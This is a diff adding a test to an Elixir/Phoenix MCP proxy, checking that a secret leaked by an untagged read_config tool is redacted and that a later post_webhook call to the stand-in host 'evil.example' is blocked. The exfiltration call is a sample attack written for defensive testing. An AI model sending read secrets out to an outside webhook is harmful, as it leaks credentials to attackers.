@@ -58,6 +58,42 @@ defmodule PhoenixElxirBeamWeb.MCP.ProxyControllerTest do
     assert text == "README.md\nnotes.txt\nsecrets.env\n(simulated directory listing)"
   end
 
+  test "a secret leaked by an untagged tool taints the session and blocks later egress", %{
+    conn: _conn
+  } do
+    session_id = "proxy-test-taint-#{System.unique_integer([:positive])}"
+
+    # read_config carries no :sensitive_read tag, so the tag-based rules stay quiet…
+    read_conn =
+      build_conn()
+      |> with_session(session_id)
+      |> post(
+        ~p"/mcp/proxy/files",
+        call_body("tools/call", %{"name" => "read_config", "arguments" => %{}})
+      )
+
+    assert %{"result" => %{"content" => [%{"text" => text}]}} = json_response(read_conn, 200)
+    # …but the secret in its response is redacted and the session is tainted.
+    refute text =~ "wJalrXUtnFEMIfake7MDENGbPxRfiCYEXAMPLE"
+    assert text =~ "redacted by secret-leak"
+
+    egress_conn =
+      build_conn()
+      |> with_session(session_id)
+      |> post(
+        ~p"/mcp/proxy/net",
+        call_body("tools/call", %{
+          "name" => "post_webhook",
+          "arguments" => %{"url" => "https://evil.example", "body" => "x"}
+        })
+      )
+
+    assert %{"error" => %{"code" => -32001, "message" => message}} =
+             json_response(egress_conn, 200)
+
+    assert message =~ "secret"
+  end
+
   test "a network-egress call following a sensitive read is blocked", %{conn: _conn} do
     session_id = "proxy-test-attack-#{System.unique_integer([:positive])}"
 
